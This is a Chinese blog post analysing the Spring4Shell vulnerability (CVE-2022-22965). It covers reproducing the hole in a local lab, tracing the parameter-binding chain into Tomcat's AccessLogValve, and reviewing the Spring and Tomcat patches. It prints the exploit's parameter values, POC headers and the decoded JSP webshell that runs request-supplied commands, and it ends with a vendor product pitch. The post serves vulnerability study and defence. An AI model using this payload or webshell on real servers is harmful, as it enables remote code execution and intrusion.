<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Spring远程命令执行漏洞（CVE-2022-22965）原理分析和思考 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Spring远程命令执行漏洞（CVE-2022-22965）原理分析和思考" />
<meta property="og:description" content="前言 上周网上爆出Spring框架存在RCE漏洞，野外流传了一小段时间后，Spring官方在3月31日正式发布了漏洞信息，漏洞编号为CVE-2022-22965。本文章对该漏洞进行了复现和分析，希望能够帮助到有相关有需要的人员进一步研究。
1►前置知识 1.1 SpringMVC参数绑定
为了方便编程，SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据Controller方法的参数，自动完成类型转换和赋值。之后，Controller方法就可以直接使用这些参数，避免了需要编写大量的代码从HttpServletRequest中获取请求数据以及类型转换。下面是一个简单的示例：
import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody; @Controllerpublic class UserController { @RequestMapping(&#34;/addUser&#34;) public @ResponseBody String addUser(User user) { return &#34;OK&#34;; }}​​​​​​ public class User { private String name; private Department department; public String getName() { return name; } public void setName(String name) { this.name = name; } public Department getDepartment() { return department; } public void setDepartment(Department department) { this.department = department; }}​​​​ public class Department { private String name; public String getName() { return name; } public void setName(String name) { this." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/230912d6fb1a4a065a842cf8fa5e38eb/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-06T16:37:31+08:00" />
<meta property="article:modified_time" content="2022-04-06T16:37:31+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Spring远程命令执行漏洞（CVE-2022-22965）原理分析和思考</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2><strong>前言</strong></h2> 
<p>上周网上爆出Spring框架存在RCE漏洞，野外流传了一小段时间后，Spring官方在3月31日正式发布了漏洞信息，漏洞编号为CVE-2022-22965。本文章对该漏洞进行了复现和分析，希望能够帮助到有相关有需要的人员进一步研究。</p> 
<p></p> 
<h2><strong>1</strong>►<strong>前置知识</strong></h2> 
<p><strong>1.1 SpringMVC参数绑定</strong></p> 
<p>为了方便编程，SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据Controller方法的参数，自动完成类型转换和赋值。之后，Controller方法就可以直接使用这些参数，避免了需要编写大量的代码从HttpServletRequest中获取请求数据以及类型转换。下面是一个简单的示例：</p> 
<pre><code>import org.springframework.stereotype.Controller;</code><code>import org.springframework.web.bind.annotation.RequestMapping;</code><code>import org.springframework.web.bind.annotation.ResponseBody;</code>
<code>@Controller</code><code>public class UserController {<!-- --></code><code>    @RequestMapping("/addUser")</code><code>    public @ResponseBody String addUser(User user) {<!-- --></code><code>        return "OK";</code><code>    }</code><code>}</code>​​​​​​</pre> 
<pre><code>public class User {<!-- --></code><code>    private String name;</code><code>    private Department department;</code>
<code>    public String getName() {<!-- --></code><code>        return name;</code><code>    }</code>
<code>    public void setName(String name) {<!-- --></code><code>        this.name = name;</code><code>    }</code>
<code>    public Department getDepartment() {<!-- --></code><code>        return department;</code><code>    }</code>
<code>    public void setDepartment(Department department) {<!-- --></code><code>        this.department = department;</code><code>    }</code><code>}</code>​​​​</pre> 
<pre><code>public class Department {<!-- --></code><code>    private String name;</code>
<code>    public String getName() {<!-- --></code><code>        return name;</code><code>    }</code>
<code>    public void setName(String name) {<!-- --></code><code>        this.name = name;</code><code>    }</code><code>}</code>
</pre> 
<p>当请求为 ：</p> 
<p>/addUser?name=test&amp;department.name=SEC时，public String addUser(User user)中的user参数内容如下：</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/e2/68/8SSJDqKy_o.png"></p> 
<p>可以看到，name自动绑定到了user参数的name属性上，department.name自动绑定到了user参数的department属性的name属性上。</p> 
<p>注意department.name这项的绑定，表明SpringMVC支持多层嵌套的参数绑定。实际上department.name的绑定是Spring通过如下的调用链实现的：</p> 
<pre><code>User.getDepartment()</code><code>    Department.setName()</code></pre> 
<p>假设请求参数名为foo.bar.baz.qux，对应Controller方法入参为Param，则有以下的调用链：​​​​​​​</p> 
<pre><code>Param.getFoo()</code><code>    Foo.getBar()</code><code>        Bar.getBaz()</code><code>            Baz.setQux() // 注意这里为set</code></pre> 
<p>SpringMVC实现参数绑定的主要类和方法是WebDataBinder.doBind(MutablePropertyValues)。</p> 
<p></p> 
<p><strong>1.2 Java Bean PropertyDescriptor</strong></p> 
<p>PropertyDescriptor是JDK自带的java.beans包下的类，意为属性描述器，用于获取符合Java Bean规范的对象属性和get/set方法。下面是一个简单的例子：​​​​​​​</p> 
<pre><code>import java.beans.BeanInfo;</code><code>import java.beans.Introspector;</code><code>import java.beans.PropertyDescriptor;</code>
<code>public class PropertyDescriptorDemo {<!-- --></code><code>    public static void main(String[] args) throws Exception {<!-- --></code><code>        User user = new User();</code><code>        user.setName("foo");</code>
<code>        BeanInfo userBeanInfo = Introspector.getBeanInfo(User.class);</code><code>        PropertyDescriptor[] descriptors = userBeanInfo.getPropertyDescriptors();</code><code>        PropertyDescriptor userNameDescriptor = null;</code><code>        for (PropertyDescriptor descriptor : descriptors) {<!-- --></code><code>            if (descriptor.getName().equals("name")) {<!-- --></code><code>                userNameDescriptor = descriptor;</code><code>                System.out.println("userNameDescriptor: " + userNameDescriptor);</code><code>                System.out.println("Before modification: ");</code><code>                System.out.println("user.name: " + userNameDescriptor.getReadMethod().invoke(user));</code><code>                userNameDescriptor.getWriteMethod().invoke(user, "bar");</code><code>            }</code><code>        }</code><code>        System.out.println("After modification: ");</code><code>        System.out.println("user.name: " + userNameDescriptor.getReadMethod().invoke(user));</code><code>    }</code><code>}</code>​​​​​</pre> 
<pre><code>userNameDescriptor: java.beans.PropertyDescriptor[name=name; values={expert=false; visualUpdate=false; hidden=false; enumerationValues=[Ljava.lang.Object;@5cb9f472; required=false}; propertyType=class java.lang.String; readMethod=public java.lang.String cn.jidun.User.getName(); writeMethod=public void cn.jidun.User.setName(java.lang.String)]</code><code>Before modification: </code><code>user.name: foo</code><code>After modification: </code><code>user.name: bar</code></pre> 
<p>从上述代码和输出结果可以看到，PropertyDescriptor实际上就是Java Bean的属性和对应get/set方法的集合。</p> 
<p></p> 
<p><strong>1.3 Spring BeanWrapperImpl</strong></p> 
<p>在Spring中，BeanWrapper接口是对Bean的包装，定义了大量可以非常方便的方法对Bean的属性进行访问和设置。</p> 
<p>BeanWrapperImpl类是BeanWrapper接口的默认实现，BeanWrapperImpl.wrappedObject属性即为被包装的Bean对象，BeanWrapperImpl对Bean的属性访问和设置最终调用的是PropertyDescriptor。​​​​​​​</p> 
<pre><code>import org.springframework.beans.BeanWrapper;</code><code>import org.springframework.beans.BeanWrapperImpl;</code>
<code>public class BeanWrapperDemo {<!-- --></code><code>    public static void main(String[] args) throws Exception {<!-- --></code><code>        User user = new User();</code><code>        user.setName("foo");</code><code>        Department department = new Department();</code><code>        department.setName("SEC");</code><code>        user.setDepartment(department);</code>
<code>        BeanWrapper userBeanWrapper = new BeanWrapperImpl(user);</code><code>        userBeanWrapper.setAutoGrowNestedPaths(true);</code><code>        System.out.println("userBeanWrapper: " + userBeanWrapper);</code>
<code>        System.out.println("Before modification: ");</code><code>        System.out.println("user.name: " + userBeanWrapper.getPropertyValue("name"));</code><code>        System.out.println("user.department.name: " + userBeanWrapper.getPropertyValue("department.name"));</code>
<code>        userBeanWrapper.setPropertyValue("name", "bar");</code><code>        userBeanWrapper.setPropertyValue("department.name", "IT");</code>
<code>        System.out.println("After modification: ");</code><code>        System.out.println("user.name: " + userBeanWrapper.getPropertyValue("name"));</code><code>        System.out.println("user.department.name: " + userBeanWrapper.getPropertyValue("department.name"));</code><code>    }</code><code>}</code>​​​​​​</pre> 
<pre><code>userBeanWrapper: org.springframework.beans.BeanWrapperImpl: wrapping object [cn.jidun.User@1d371b2d]</code><code>Before modification: </code><code>user.name: foo</code><code>user.department.name: SEC</code><code>After modification: </code><code>user.name: bar</code><code>user.department.name: IT</code></pre> 
<p>从上述代码和输出结果可以看到，通过BeanWrapperImpl可以很方便地访问和设置Bean的属性，比直接使用PropertyDescriptor要简单很多。</p> 
<p></p> 
<p><strong>1.4Tomcat AccessLogValve 和 access_log</strong></p> 
<p>Tomcat的Valve用于处理请求和响应，通过组合了多个Valve的Pipeline，来实现按次序对请求和响应进行一系列的处理。其中AccessLogValve用来记录访问日志access_log。Tomcat的server.xml中默认配置了AccessLogValve，所有部署在Tomcat中的Web应用均会执行该Valve，内容如下：​​​​​​​</p> 
<pre><code>&lt;Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs"</code><code>               prefix="localhost_access_log" suffix=".txt"</code><code>               pattern="%h %l %u %t &amp;quot;%r&amp;quot; %s %b" /&gt;</code></pre> 
<p>下面列出配置中出现的几个重要属性：</p> 
<p>· directory：access_log文件输出目录。</p> 
<p>· prefix：access_log文件名前缀。</p> 
<p>· pattern：access_log文件内容格式。</p> 
<p>· suffix：access_log文件名后缀。</p> 
<p>· fileDateFormat：access_log文件名日期后缀，默认为.yyyy-MM-dd。</p> 
<p></p> 
<h2><strong>2</strong>►<strong>漏洞复现</strong></h2> 
<p>1.创建一个maven项目，pom.xml内容如下：​​​​​​​</p> 
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code><code>&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</code><code>         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;</code><code>    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</code><code>    &lt;parent&gt;</code><code>        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</code><code>        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</code><code>        &lt;version&gt;2.6.3&lt;/version&gt;</code><code>        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</code><code>    &lt;/parent&gt;</code><code>    &lt;groupId&gt;com.example&lt;/groupId&gt;</code><code>    &lt;artifactId&gt;CVE-2022-22965&lt;/artifactId&gt;</code><code>    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</code><code>    &lt;packaging&gt;war&lt;/packaging&gt;</code><code>    &lt;dependencies&gt;</code><code>        &lt;dependency&gt;</code><code>            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</code><code>            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</code><code>        &lt;/dependency&gt;</code><code>        &lt;dependency&gt;</code><code>            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</code><code>            &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</code><code>            &lt;scope&gt;provided&lt;/scope&gt;</code><code>        &lt;/dependency&gt;</code><code>    &lt;/dependencies&gt;</code><code>    &lt;build&gt;</code><code>        &lt;plugins&gt;</code><code>            &lt;plugin&gt;</code><code>                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</code><code>                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</code><code>            &lt;/plugin&gt;</code><code>        &lt;/plugins&gt;</code><code>    &lt;/build&gt;</code><code>&lt;/project&gt;</code></pre> 
<p>2.项目中添加如下代码，作为SpringBoot的启动类：​​​​​​​</p> 
<pre><code>import org.springframework.boot.SpringApplication;</code><code>import org.springframework.boot.autoconfigure.SpringBootApplication;</code><code>import org.springframework.boot.builder.SpringApplicationBuilder;</code><code>import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;</code>
<code>@SpringBootApplication</code><code>public class ApplicationMain extends SpringBootServletInitializer {<!-- --></code><code>    @Override</code><code>    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {<!-- --></code><code>        return builder.sources(ApplicationMain.class);</code><code>    }</code>
<code>    public static void main(String[] args) {<!-- --></code><code>        SpringApplication.run(ApplicationMain.class, args);</code><code>    }</code><code>}</code></pre> 
<p></p> 
<p>3.将章节1.1 SpringMVC参数绑定中的User类和UserController类添加到项目中。</p> 
<p>4.执行maven打包命令，将项目打包为war包，命令如下：</p> 
<pre><code>mvn clean package</code></pre> 
<p>5.将项目中target目录里打包生成的CVE-2022-22965-0.0.1-SNAPSHOT.war，复制到Tomcat的webapps目录下，并启动Tomcat。</p> 
<p>6.从https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py 下载POC文件，执行如下命令：</p> 
<pre><code>python3 poc.py --url http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser</code></pre> 
<p></p> 
<p>7.浏览器中访问http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=gnome-calculator，复现漏洞。</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/e2/34/yfwXiJJi_o.png"></p> 
<p></p> 
<h2><strong>3</strong>►<strong>漏洞分析</strong></h2> 
<p><strong>3.1 POC分析</strong></p> 
<p>我们从POC入手进行分析。通过对POC中的data URL解码后可以拆分成如下5对参数。</p> 
<p></p> 
<p><strong>3.1.1 pattern参数</strong></p> 
<p>参数名：class.module.classLoader.resources.context.parent.pipeline.first.pattern</p> 
<p>参数值：</p> 
<p>%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i</p> 
<p>很明显，这个参数是SpringMVC多层嵌套参数绑定。我们可以推测出如下的调用链：​​​​​​​</p> 
<pre><code>User.getClass()</code><code>    java.lang.Class.getModule()</code><code>        ......</code><code>            SomeClass.setPattern()</code></pre> 
<p></p> 
<p>那实际运行过程中的调用链是怎样的呢？SomeClass是哪个类呢？带着这些问题，我们在前置知识中提到的实现SpringMVC参数绑定的主要方法WebDataBinder.doBind(MutablePropertyValues)上设置断点。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/df/eb/hJxZABIq_o.png"></p> 
<p></p> 
<p>经过一系列的调用逻辑后，我们来到AbstractNestablePropertyAccessor第814行，getPropertyAccessorForPropertyPath(String)方法。该方法通过递归调用自身，实现对class.module.classLoader.resources.context.parent.pipeline.first.pattern的递归解析，设置整个调用链。</p> 
<p><strong>我们重点关注第820行，</strong>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);，该行主要实现每层嵌套参数的获取。我们在该行设置断点，查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/e4/6c/dw66Lw2t_o.png"></p> 
<p></p> 
<p><strong>第一轮迭代</strong></p> 
<p>进入</p> 
<p>getPropertyAccessorForPropertyPath(String)</p> 
<p>方法前：</p> 
<p><strong>·</strong> this：User的BeanWrapperImpl包装实例</p> 
<p><strong>·</strong>propertyPath：class.module.classLoader.resources.context.parent.pipeline.first.pattern</p> 
<p><strong>·</strong>nestedPath：module.classLoader.resources.context.parent.pipeline.first.pattern</p> 
<p>·nestedProperty：class，即本轮迭代需要解析的嵌套参数</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/91/84/Q0YhAYsh_o.png"></p> 
<p></p> 
<p>进入方法，经过一系列的调用逻辑后，最终来到BeanWrapperImpl第308行，BeanPropertyHandler.getValue()方法中。可以看到class嵌套参数最终通过反射调用User的父类java.lang.Object.getClass()，获得返回java.lang.Class实例。</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/5a/02/QhWjk0Ty_o.png"></p> 
<p></p> 
<p>getPropertyAccessorForPropertyPath(String)方法返回后：</p> 
<p>this：User的BeanWrapperImpl包装实例</p> 
<p>propertyPath：class.module.classLoader.resources.context.parent.pipeline.first.pattern</p> 
<p>nestedPath：module.classLoader.resources.context.parent.pipeline.first.pattern，作为下一轮迭代的propertyPath</p> 
<p>nestedProperty：class，即本轮迭代需要解析的嵌套参数</p> 
<p>nestedPa：java.lang.Class的BeanWrapperImpl包装实例，作为下一轮迭代的this</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/48/d7/3tzDfjIk_o.png"></p> 
<p></p> 
<p>经过第一轮迭代，我们可以得出第一层调用链：​​​​​​​</p> 
<pre><code>User.getClass()</code><code>    java.lang.Class.get???() // 下一轮迭代实现</code></pre> 
<p></p> 
<p><strong>第二轮迭代</strong></p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/29/c9/xMoviBmM_o.png"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/e4/c8/gPN1EJDz_o.png"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/d1/e3/EYUwTb7k_o.png"></p> 
<p></p> 
<p>module嵌套参数最终通过反射调用java.lang.Class.getModule()，获得返回java.lang.Module实例。</p> 
<p></p> 
<p>经过第二轮迭代，我们可以得出第二层调用链：​​​​​​​</p> 
<pre><code>User.getClass()</code><code>    java.lang.Class.getModule()</code><code>        java.lang.Module.get???() // 下一轮迭代实现</code></pre> 
<p><strong>第三轮迭代</strong></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/26/b1/IVOM4fRE_o.png"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/21/10/zHbjBXXO_o.png"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/c6/10/fVVcDYpO_o.png"></p> 
<p></p> 
<p>classLoader嵌套参数最终通过反射调用java.lang.Module.getClassLoader()，获得返回org.apache.catalina.loader.ParallelWebappClassLoader实例。</p> 
<p></p> 
<p>经过第三轮迭代，我们可以得出第三层调用链：​​​​​​​</p> 
<pre><code>User.getClass()</code><code>    java.lang.Class.getModule()</code><code>        java.lang.Module.getClassLoader()</code><code>            org.apache.catalina.loader.ParallelWebappClassLoader.get???() // 下一轮迭代实现</code></pre> 
<p></p> 
<p>接着按照上述调试方法，依次调试剩余的递归轮次并观察相应的变量，最终可以得到如下完整的调用链：</p> 
<p></p> 
<pre><code>User.getClass()</code><code>    java.lang.Class.getModule()</code><code>        java.lang.Module.getClassLoader()</code><code>            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code><code>                org.apache.catalina.webresources.StandardRoot.getContext()</code><code>                    org.apache.catalina.core.StandardContext.getParent()</code><code>                        org.apache.catalina.core.StandardHost.getPipeline()</code><code>                            org.apache.catalina.core.StandardPipeline.getFirst()</code><code>                                org.apache.catalina.valves.AccessLogValve.setPattern()</code></pre> 
<p></p> 
<p>可以看到，pattern参数最终对应AccessLogValve.setPattern()，即将AccessLogValve的pattern属性设置为%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i，也就是access_log的文件内容格式。</p> 
<p>我们再来看pattern参数值，除了常规的Java代码外，还夹杂了三个特殊片段。通过翻阅AccessLogValve的父类AbstractAccessLogValve的源码，可以找到相关的文档：</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/38/b0/nheHCOvb_o.png"></p> 
<p>即通过AccessLogValve输出的日志中可以通过形如%{param}i等形式直接引用HTTP请求和响应中的内容。完整文档请参考文章末尾的参考章节。</p> 
<p>结合poc.py中headers变量内容：​​​​​​​</p> 
<pre><code>headers = {"suffix":"%&gt;//",</code><code>            "c1":"Runtime",</code><code>            "c2":"&lt;%",</code><code>            "DNT":"1",</code><code>            "Content-Type":"application/x-www-form-urlencoded"</code><code>}</code></pre> 
<p>最终可以得到AccessLogValve输出的日志实际内容如下（已格式化）：​​​​​​​</p> 
<pre><code>&lt;%</code><code>if("j".equals(request.getParameter("pwd"))){<!-- --></code><code>  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();</code><code> int a = -1;</code><code> byte[] b = new byte[2048];</code><code> while((a=in.read(b))!=-1){<!-- --></code><code>    out.println(new String(b));</code><code>  }</code><code>}</code><code>%&gt;//</code></pre> 
<p>很明显，这是一个JSP webshell。这个webshell输出到了哪儿？名称是什么？能被直接访问和正常解析执行吗？我们接下来看其余的参数。</p> 
<p></p> 
<p><strong>3.1.2 suffix参数</strong></p> 
<p>参数名：</p> 
<p>class.module.classLoader.resources.context.parent.pipeline.first.suffix</p> 
<p>参数值：.jsp</p> 
<p>按照pattern参数相同的调试方法，suffix参数最终将AccessLogValve.suffix设置为.jsp，即access_log的文件名后缀。</p> 
<p></p> 
<p><strong>3.1.3 directory参数</strong></p> 
<p>参数名：class.module.classLoader.resources.context.parent.pipeline.first.directory</p> 
<p>参数值：webapps/ROOT</p> 
<p>按照pattern参数相同的调试方法，directory参数最终将AccessLogValve.directory设置为webapps/ROOT，即access_log的文件输出目录。</p> 
<p>这里提下webapps/ROOT目录，该目录为Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过http://localhost:8080/根目录访问。</p> 
<p></p> 
<p><strong>3.1.4 prefix参数</strong></p> 
<p>参数名：class.module.classLoader.resources.context.parent.pipeline.first.prefix</p> 
<p>参数值：tomcatwar</p> 
<p>按照pattern参数相同的调试方法，prefix参数最终将AccessLogValve.prefix设置为tomcatwar，即access_log的文件名前缀。</p> 
<p></p> 
<p><strong>3.1.5 fileDateFormat参数</strong></p> 
<p>参数名：class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</p> 
<p>参数值：空</p> 
<p>按照pattern参数相同的调试方法，fileDateFormat参数最终将AccessLogValve.fileDateFormat设置为空，即access_log的文件名不包含日期。</p> 
<p></p> 
<p><strong>3.1.6 总结</strong></p> 
<p>至此，经过上述的分析，结论非常清晰了：通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat AccessLogValve的属性，让Tomcat在webapps/ROOT目录输出定制的“访问日志”tomcatwar.jsp，该“访问日志”实际上为一个JSP webshell。</p> 
<p>在SpringMVC参数绑定的实际调用链中，有几个关键点直接影响到了漏洞能否成功利用。</p> 
<p></p> 
<p><strong>3.2 漏洞利用关键点</strong></p> 
<p></p> 
<p><strong>3.2.1 关键点一：Web应用部署方式</strong></p> 
<p>从java.lang.Module到org.apache.catalina.loader.ParallelWebappClassLoader，是将调用链转移到Tomcat，并最终利用AccessLogValve输出webshell的关键。</p> 
<p>ParallelWebappClassLoader在Web应用以war包部署到Tomcat中时使用到。现在很大部分公司会使用SpringBoot可执行jar包的方式运行Web应用，在这种方式下，我们看下classLoader嵌套参数被解析为什么，如下图：</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/d8/c2/bXXDl9FY_o.png"></p> 
<p>可以看到，使用SpringBoot可执行jar包的方式运行，classLoader嵌套参数被解析为org.springframework.boot.loader.LaunchedURLClassLoader，查看其源码，没有getResources()方法。具体源码请参考文章末尾的参考章节。</p> 
<p>这就是为什么本漏洞利用条件之一，Web应用部署方式需要是Tomcat war包部署。</p> 
<p></p> 
<p><strong>3.2.2 关键点二：JDK版本</strong></p> 
<p>在前面章节中AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);调用的过程中，实际上Spring做了一道防御。</p> 
<p>Spring使用org.springframework.beans.CachedIntrospectionResults缓存并返回Java Bean中可以被BeanWrapperImpl使用的PropertyDescriptor。在CachedIntrospectionResults第289行构造方法中：</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/28/e2/t8go80D4_o.png"></p> 
<p></p> 
<p>该行的意思是：当Bean的类型为java.lang.Class时，不返回classLoader和protectionDomain的PropertyDescriptor。Spring在构建嵌套参数的调用链时，会根据CachedIntrospectionResults缓存的PropertyDescriptor进行构建：</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/01/1d/iOl5lJTt_o.png"></p> 
<p></p> 
<p>不返回，也就意味着class.classLoader...这种嵌套参数走不通，即形如下方的调用链：</p> 
<pre><code>Foo.getClass()</code><code>    java.lang.Class.getClassLoader()</code><code>        BarClassLoader.getBaz()</code><code>            ......</code></pre> 
<p>这就是为什么本漏洞利用条件之二，JDK&gt;=1.9。</p> 
<p></p> 
<h2><strong>4</strong>►<strong>补丁分析</strong></h2> 
<p><strong>4.1 Spring 5.3.18补丁</strong></p> 
<p>通过对比Spring 5.3.17和5.3.18的版本，可以看到在3月31日有一项名为“Redefine PropertyDescriptor filter的”提交。</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/cd/96/p7XMBXBz_o.png"></p> 
<p>进入该提交，可以看到对CachedIntrospectionResults构造函数中Java Bean的PropertyDescriptor的过滤条件被修改了：当Java Bean的类型为java.lang.Class时，仅允许获取name以及Name后缀的属性描述符。在章节3.2.2 关键点二：JDK版本中，利用java.lang.Class.getModule()的链路就走不通了。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/32/2a/EHmg7qWc_o.png"></p> 
<p><strong>4.2 Tomcat 9.0.62补丁</strong></p> 
<p>通过对比Tomcat 9.0.61和9.0.62的版本，可以看到在4月1日有一项名为“Security hardening. Deprecate getResources() and always return null.”提交。</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/64/5a/WhSadrcS_o.png"></p> 
<p>进入该提交，可以看到对getResources()方法的返回值做了修改，直接返回null。WebappClassLoaderBase即ParallelWebappClassLoader的父类，在章节3.2.1 关键点一：Web应用部署方式中，利用org.apache.catalina.loader.ParallelWebappClassLoader.getResources()的链路就走不通了。</p> 
<p></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/6d/80/JQ7GG2Cb_o.png"></p> 
<p></p> 
<h2><strong>5</strong>►<strong>思考</strong></h2> 
<p>通过将代码输出到日志文件，并控制日志文件被解释执行，这在漏洞利用方法中也较为常见。通常事先往服务器上写入包含代码的“日志”文件，并利用文件包含漏洞解释执行该“日志”文件。写入“日志”文件可以通过Web服务中间件自身的日志记录功能顺带实现，也可以通过SQL注入、文件上传漏洞等曲线实现。</p> 
<p>与上文不同的是，本次漏洞并不需要文件包含。究其原因，Java Web服务中间件自身也是用Java编写和运行的，而部署运行在上面的Java Web应用，实际上是Java Web服务中间件进程的一部分，两者间通过Servlet API标准接口在进程内部进行“通讯”。依靠Java语言强大的运行期反射能力，给予了攻击者可以通过Java Web应用漏洞进而攻击Java Web服务中间件的能力。也就是本次利用Web应用自身的Spring漏洞，进而修改了Web服务中间件Tomcat的access_log配置内容，直接输出可执行的“日志”文件到Web 应用目录下。</p> 
<p>在日常开发中，应该严格控制Web应用可解释执行目录为只读不可写，日志、上传文件等运行期可以修改的目录应该单独设置，并且不可执行。</p> 
<p>本次漏洞虽然目前调用链中仅利用到了Tomcat，但只要存在一个从Web应用到Web服务中间件的class.module.classLoader....合适调用链，理论上Jetty、Weblogic、Glassfish等也可利用。另外，目前通过写入日志文件的方式，也可能通过其它文件，比如配置文件，甚至是内存马的形式出现。</p> 
<p>本次漏洞目前唯一令人“欣慰”的一点是，仅对JDK&gt;=1.9有效。相信不少公司均为“版本任你发，我用Java 8！”的状态，但这也仅仅是目前。与其抱着侥幸心理，不如按计划老老实实升级Spring。</p> 
<p></p> 
<p><strong>析策XDR平台</strong></p> 
<p>同Log4jShell中的Log4j2一样，Spring框架几乎是一个类似JDK级别的基础类库，即便自身应用程序里完成了升级，但仍有极其庞大的其它框架、中间件，导致升级工作同样极为困难。绝大部分公司采取的方案是在边界防护设备上使用“临时补丁”的方式。同时，大量bypass方法也随之而来，这将是一个漫长的过程。</p> 
<p>“临时补丁”意味着无法根除，而底层依赖的升级又极为耗时，那么，如何更好地发现并规避在此期间产生的风险呢？</p> 
<p>极盾科技的析策XDR平台，通过收集企业内部各类安全日志、流量，基于这些数据进行全局的、跨端的实时关联分析，挖掘其中隐匿的风险，并提供一套可灵活编排的风险处置流程，最大程度上提升了企业的安全感知和处理能力。即便有人利用本漏洞突破了边界，在造成更大影响之前，通过多端数据的关联分析，即可更早地被析策XDR平台感知到入侵是否已经发生了，进行到了哪个阶段，可以及时阻断处理。平台更详细的介绍见如下链接：</p> 
<p>https://www.jidun.cn/product/xice</p> 
<p></p> 
<h2><strong>参考</strong></h2> 
